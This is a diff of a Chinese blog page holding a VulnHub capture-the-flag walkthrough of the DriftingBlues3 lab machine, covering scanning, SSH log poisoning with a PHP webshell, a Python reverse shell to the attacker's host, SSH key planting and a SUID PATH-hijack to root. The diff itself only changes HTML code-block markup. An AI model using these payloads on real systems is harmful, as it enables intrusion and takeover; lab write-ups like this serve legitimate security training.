@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="信息收集主机发现1arp-scan -l   端口扫描1nmap -sC -sV -p- 192.168.62.173    只开放了22和80端口，先访问80端口看看  好像没有什么信息，扫一下目录 1dirsearch -u http:&#x2F;&#x2F;192.168.62.173&#x2F;   有点奇怪，逐个看了一下，好像都是没用的信息  再看看robots.txt，是唯一有用的路径  接着访问一下  emmm再">
+    <meta name="description" content="信息收集主机发现arp-scan -l   端口扫描nmap -sC -sV -p- 192.168.62.173    只开放了22和80端口，先访问80端口看看  好像没有什么信息，扫一下目录 dirsearch -u http:&#x2F;&#x2F;192.168.62.173&#x2F;   有点奇怪，逐个看了一下，好像都是没用的信息  再看看robots.txt，是唯一有用的路径  接着访问一下  emmm再接再厉">
 <meta property="og:type" content="article">
 <meta property="og:title" content="driftingblues3 VulnHub Walkthrough">
 <meta property="og:url" content="http://example.com/2021/10/13/driftingblues3-VulnHub-Walkthrough/index.html">
 <meta property="og:site_name" content="colind0pe&#39;s blog">
-<meta property="og:description" content="信息收集主机发现1arp-scan -l   端口扫描1nmap -sC -sV -p- 192.168.62.173    只开放了22和80端口，先访问80端口看看  好像没有什么信息，扫一下目录 1dirsearch -u http:&#x2F;&#x2F;192.168.62.173&#x2F;   有点奇怪，逐个看了一下，好像都是没用的信息  再看看robots.txt，是唯一有用的路径  接着访问一下  emmm再">
+<meta property="og:description" content="信息收集主机发现arp-scan -l   端口扫描nmap -sC -sV -p- 192.168.62.173    只开放了22和80端口，先访问80端口看看  好像没有什么信息，扫一下目录 dirsearch -u http:&#x2F;&#x2F;192.168.62.173&#x2F;   有点奇怪，逐个看了一下，好像都是没用的信息  再看看robots.txt，是唯一有用的路径  接着访问一下  emmm再接再厉">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://i.loli.net/2021/10/13/gbHz2QBdPq1Fr5m.png">
 <meta property="og:image" content="https://i.loli.net/2021/10/13/dyUSqGQHbJYXtcP.png">
@@ -190,17 +190,17 @@
   
 
   <div class="content" itemprop="articleBody">
-    <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
-
+    <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><pre><code>arp-scan -l
+</code></pre>
 <p><img src="https://i.loli.net/2021/10/13/gbHz2QBdPq1Fr5m.png"></p>
-<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.62.173 </span><br></pre></td></tr></table></figure>
-
+<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><pre><code>nmap -sC -sV -p- 192.168.62.173 
+</code></pre>
 <p><img src="https://i.loli.net/2021/10/13/dyUSqGQHbJYXtcP.png"></p>
 <p>只开放了22和80端口，先访问80端口看看</p>
 <p><img src="https://i.loli.net/2021/10/13/v23PbJpqjdwMiXl.png"></p>
 <p>好像没有什么信息，扫一下目录</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.62.173/</span><br></pre></td></tr></table></figure>
-
+<pre><code>dirsearch -u http://192.168.62.173/
+</code></pre>
 <p><img src="https://i.loli.net/2021/10/13/QvTbR73iftpaIZY.png"></p>
 <p>有点奇怪，逐个看了一下，好像都是没用的信息</p>
 <p><img src="https://i.loli.net/2021/10/13/DcIX8Bov5bh4KlS.png"></p>
@@ -225,8 +225,8 @@
 <p>可以看到两个登录用户名都已经记录了，那接下来就尝试通过日志写shell</p>
 <p><img src="https://i.loli.net/2021/10/13/UXd7Z2kRHJmP8cu.png"></p>
 <h3 id="漏洞利用-amp-getshell"><a href="#漏洞利用-amp-getshell" class="headerlink" title="漏洞利用&amp;getshell"></a>漏洞利用&amp;getshell</h3><p>以php的webshell作为用户名来登录ssh</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh &#x27;&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;&#x27;@192.168.62.173</span><br></pre></td></tr></table></figure>
-
+<pre><code>ssh &#39;&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;&#39;@192.168.62.173
+</code></pre>
 <p><img src="https://i.loli.net/2021/10/13/VQBO5Tumo1YRdLN.png"></p>
 <p>看一下效果，看到已经可以执行命令了</p>
 <p><img src="https://i.loli.net/2021/10/13/hEsStkQvywi58UL.png"></p>
@@ -236,28 +236,28 @@
 <p>先开启一个监听端口来接收反弹的shell</p>
 <p><img src="https://i.loli.net/2021/10/13/e6KnGq2tVahXDj3.png"></p>
 <p>访问一下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.62.173/adminsfixit.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.62.134%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)%27</span><br></pre></td></tr></table></figure>
-
+<pre><code>http://192.168.62.173/adminsfixit.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.62.134%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)%27
+</code></pre>
 <p>在本机已经接收到了shell</p>
 <p><img src="https://i.loli.net/2021/10/13/i1go6kHnBwEvKqZ.png"></p>
 <h4 id="SSH登录"><a href="#SSH登录" class="headerlink" title="SSH登录"></a>SSH登录</h4><p>进入到/home/robertj目录，发现.ssh是有写权限的，那我们就可以将我们的公钥写进去，实现免密登录</p>
 <p>先在本地生成公私钥</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen	#一直回默认就可以</span><br></pre></td></tr></table></figure>
-
+<pre><code>ssh-keygen    #一直回默认就可以
+</code></pre>
 <img src="https://i.loli.net/2021/10/13/uRrKZvgWmeOd2wz.png" style="zoom:80%;" />
 
 <p>进入本地ssh目录，查看一下id_rsa.pub</p>
 <p><img src="https://i.loli.net/2021/10/13/86VYpyWAalHc1I3.png"></p>
 <p>将id_rsa.pub的内容复制到authorized_keys</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat id_rsa.pub &gt;&gt; authorized_keys</span><br></pre></td></tr></table></figure>
-
+<pre><code>cat id_rsa.pub &gt;&gt; authorized_keys
+</code></pre>
 <p>然后上传到靶机的ssh目录，先在本机用python开启一个http服务</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
-
+<pre><code>python3 -m http.server 80
+</code></pre>
 <p><img src="https://i.loli.net/2021/10/13/McPewFdQo6hHbUx.png"></p>
 <p>到靶机的ssh目录通过wget下载</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.62.134/authorized_keys</span><br></pre></td></tr></table></figure>
-
+<pre><code>wget http://192.168.62.134/authorized_keys
+</code></pre>
 <p><img src="https://i.loli.net/2021/10/13/Gj84pDCxswU3HM5.png"></p>
 <p>现在可以实现ssh免密登录了</p>
 <p><img src="https://i.loli.net/2021/10/13/IhaoP4B9NQnbAKF.png"></p>
@@ -265,8 +265,8 @@
 <img src="https://i.loli.net/2021/10/13/KzHwX46Zqn2ux51.png" style="zoom:67%;" />
 
 <h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>先看一下具有suid的可执行文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
+<pre><code>find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre>
 <p><img src="https://i.loli.net/2021/10/13/K9mLIjMbpYq5Du2.png"></p>
 <p>看到有一个getinfo命令，先执行一下看看</p>
 <img src="https://i.loli.net/2021/10/13/JMgydKAf6sW3wYE.png"  />
@@ -274,12 +274,14 @@
 <p>看着应该是分别执行了ip a、cat /etc/hosts、uname -a命令</p>
 <p>那么执行具有suid的getinfo时，将会执行ip、cat、uname，那我们就可以写一个模拟可执行文件</p>
 <p>这里我在tmp目录新建一个文件ip，并赋予执行权限</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt; /tmp/ip</span><br><span class="line">chmod +x /tmp/ip</span><br></pre></td></tr></table></figure>
-
+<pre><code>echo &quot;/bin/bash&quot; &gt; /tmp/ip
+chmod +x /tmp/ip
+</code></pre>
 <p><img src="https://i.loli.net/2021/10/13/vGzTbRejQkKW7NB.png"></p>
 <p>最后，添加一个环境变量/tmp，这样再执行一次具有suid的getinfo时，就会以root权限执行我们新建的/tmp/ip，我们就可以提权到root了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">/usr/bin/getinfo</span><br></pre></td></tr></table></figure>
-
+<pre><code>export PATH=/tmp:$PATH
+/usr/bin/getinfo
+</code></pre>
 <p><img src="https://i.loli.net/2021/10/13/jafxOrYPwXck6SQ.png"></p>
 <p>现在可以获取第二个flag了</p>
 <img src="https://i.loli.net/2021/10/13/N6vYROXlgVuKbWU.png" style="zoom:67%;" />
